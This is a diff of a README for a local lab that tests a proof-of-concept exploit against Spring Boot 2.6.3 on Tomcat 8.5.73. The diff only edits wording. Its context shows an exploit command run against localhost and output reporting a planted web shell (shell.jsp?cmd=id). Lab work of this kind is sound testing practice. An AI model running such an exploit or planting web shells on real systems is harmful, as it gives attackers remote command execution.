@@ -1,6 +1,6 @@
 # Lab 1: Vulnerable deployment
 
-Lab to test poc exploit on vulnerable spring boot version 2.6.3 deployed on fixed tomcat version 8.5.73 with open-jdk 11
+Lab to test poc exploit on vulnerable spring boot version 2.6.3 deployed on vulnerable tomcat version 8.5.73 with open-jdk 11
 ```
 Tomcat version: 8.5.73
 openJDK: 11
@@ -62,8 +62,7 @@ $ python exploit.py --url http://localhost:8000/helloworld/greeting
 [+] Shell should be at: http://localhost:8000/shell.jsp?cmd=id
 ```
 
-It gives 200 OK response which mease exploit is successful to confirm go to http://localhost:8000/shell.jsp?cmd=id so now
-it is confirmed that spring boot version 2.6.3 running on tomcat version 8.5.73 with jdk11 is vulnerable.
+It gives 200 OK response which mease exploit is successful to confirm go to http://localhost:8000/shell.jsp?cmd=id and you will se `id` command output so now it is confirmed that spring boot version 2.6.3 running on tomcat version 8.5.73 with jdk11 is vulnerable.
 
 
 let's try another poc
